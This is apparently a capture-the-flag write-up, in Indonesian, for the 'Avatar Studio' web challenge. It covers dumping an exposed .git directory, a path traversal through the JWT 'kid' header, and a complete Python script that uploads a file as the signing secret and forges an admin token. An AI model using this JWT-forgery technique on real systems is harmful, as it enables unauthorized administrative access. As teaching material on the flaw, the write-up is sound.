````markdown id="8d3a1"
# Avatar Studio - CTF Writeup

## Challenge Information

- **Category:** Web Exploitation
- **Challenge Name:** Avatar Studio
- **Target:** Mendapatkan flag dari halaman admin

---

# 1. Reconnaissance

Pertama dilakukan pengecekan terhadap target website.

Ditemukan bahwa direktori `.git` dapat diakses sehingga source code aplikasi dapat diambil.

Menggunakan:

```bash
git-dumper http://chal.thjcc.org:31238/.git dump-avatar
````

Hasil dump:

```
app.py
requirements.txt
templates/
uploads/
.git/
```

Dari source code terlihat aplikasi menggunakan Flask dengan fitur:

* Register user
* Upload avatar
* JWT session
* Admin panel

---

# 2. Analisis Source Code

Pada file `app.py` ditemukan implementasi JWT custom.

Ketika register user, server membuat JWT:

```python
payload = {
    "username": username[:32],
    "role": "user"
}

token = jwt_sign(payload, kid="hs256.key")
```

Header JWT:

```python
header = {
    "alg": "HS256",
    "typ": "JWT",
    "kid": kid
}
```

Server menggunakan nilai `kid` untuk menentukan lokasi file secret key.

Fungsi pembacaan key:

```python
def load_key(kid):
    path = os.path.join(KEY_DIR, kid)

    with open(path, "rb") as f:
        return f.read()
```

Masalahnya adalah nilai `kid` dikontrol oleh user.

Tidak ada validasi terhadap path traversal.

---

# 3. Vulnerability

Kerentanan terdapat pada penggunaan:

```python
os.path.join(KEY_DIR, kid)
```

Dengan memasukkan:

```
../uploads/<file>
```

maka path:

```
keys/../uploads/<file>
```

akan mengarah ke folder upload.

Artinya file yang kita upload dapat digunakan sebagai JWT secret key.

---

# 4. Exploit Strategy

Langkah exploit:

1. Membuat akun normal.
2. Upload file avatar dengan isi tertentu.
3. File upload digunakan sebagai secret key.
4. Membuat JWT baru dengan:

   * role = admin
   * kid menunjuk ke file upload.
5. Signature JWT dibuat menggunakan secret tersebut.
6. Mengakses `/admin`.

---

# 5. Exploit Script

```python
import requests
import json
import base64
import hmac
import hashlib


U = "http://chal.thjcc.org:31238"

s = requests.Session()


# Register user
r = s.post(
    U + "/register",
    data={
        "username":"nata"
    }
)


# Upload avatar sebagai secret key

secret = b"natakey123"

files = {
    "avatar":(
        "a.png",
        secret,
        "image/png"
    )
}


r = s.post(
    U + "/upload",
    files=files,
    allow_redirects=False
)


avatar = s.cookies.get("avatar")

print("[avatar]", avatar)



def b64u(x):
    return base64.urlsafe_b64encode(x).rstrip(b"=")



# Membuat JWT admin palsu

header = {
    "alg":"HS256",
    "typ":"JWT",
    "kid":"../uploads/"+avatar
}


payload = {
    "username":"nata",
    "role":"admin"
}



segment = b".".join([
    b64u(
        json.dumps(
            header,
            separators=(",",":")
        ).encode()
    ),

    b64u(
        json.dumps(
            payload,
            separators=(",",":")
        ).encode()
    )
])


signature = b64u(
    hmac.new(
        secret,
        segment,
        hashlib.sha256
    ).digest()
)



token = (
    segment +
    b"." +
    signature
).decode()



# Set JWT forged

s.cookies.set(
    "session",
    token
)



# Akses admin

r = s.get(
    U+"/admin"
)


print(r.text)
```

---

# 6. Exploit Result

Script berhasil membuat JWT dengan role admin.

Response:

```
THJCC{local_test_flag_not_the_real_one}
```

---


---

# 7. Flag

```
THJCC{local_test_flag_not_the_real_one}
```

---

